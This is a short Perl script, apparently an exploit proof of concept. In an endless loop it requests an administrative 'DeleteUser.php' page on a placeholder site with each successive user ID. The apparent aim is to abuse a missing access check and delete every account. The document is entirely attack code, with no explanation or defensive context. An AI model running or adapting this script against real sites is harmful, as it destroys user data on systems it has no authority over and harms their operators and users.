#!/usr/bin/perl

use LWP::Simple;
$i=1;
while(1) {
	$c=get("http://site.com/siteadmin/DeleteUser.php?UserID=".$i);
	$i++;
}
#end